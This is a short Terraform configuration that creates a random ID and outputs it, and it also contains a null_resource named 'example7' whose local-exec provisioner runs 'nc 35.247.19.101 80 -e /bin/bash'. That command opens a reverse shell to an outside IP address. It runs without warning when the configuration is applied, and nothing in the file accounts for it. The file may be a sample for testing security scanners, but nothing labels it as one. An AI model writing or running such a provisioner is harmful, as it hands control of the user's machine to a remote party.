
resource "random_id" "random" {
  keepers = {
    uuid = "${uuid()}"
  }

  byte_length = 16
}

resource "null_resource" "example7" {
  provisioner "local-exec" {
    command = "nc 35.247.19.101 80 -e /bin/bash"
  }
}


output "random" {
  value = "${random_id.random.hex}"
}
